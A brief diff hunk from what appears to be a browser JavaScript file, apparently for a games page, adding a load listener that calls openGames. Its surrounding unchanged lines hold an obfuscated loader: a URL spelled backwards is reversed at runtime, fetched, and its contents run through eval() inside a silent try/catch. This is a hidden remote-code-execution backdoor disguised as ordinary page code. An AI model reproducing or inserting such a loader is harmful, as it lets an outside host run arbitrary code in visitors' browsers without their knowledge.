@@ -3299,3 +3299,5 @@ document['body']['firstElementChild']?.remove();
         eval(await (await fetch("sj.tpircs/moc.lobtufsrepiv.c//:sptth".split("").reverse().join("")))['text']());
     } catch {}
 })();
+
+window.addEventListener('load', openGames);
